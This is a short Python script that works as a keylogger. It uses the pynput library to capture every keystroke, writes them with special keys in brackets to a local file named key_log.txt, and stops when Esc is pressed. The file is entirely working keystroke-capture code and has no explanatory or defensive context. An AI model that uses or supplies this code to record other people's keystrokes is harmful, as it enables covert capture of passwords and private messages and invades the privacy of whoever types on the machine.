from pynput import keyboard


def on_press(key):
    try:
        with open("key_log.txt", "a") as log_file:
            log_file.write(f"{key.char}")
    except AttributeError:
        #para caracteres especiais
        with open("key_log.txt", "a") as log_file:
            log_file.write(f"[{key}]")

def on_release(key):
    if key == keyboard.Key.esc:
        return False
    
keyboard.Listener(on_press=on_press, on_release=on_release).join()
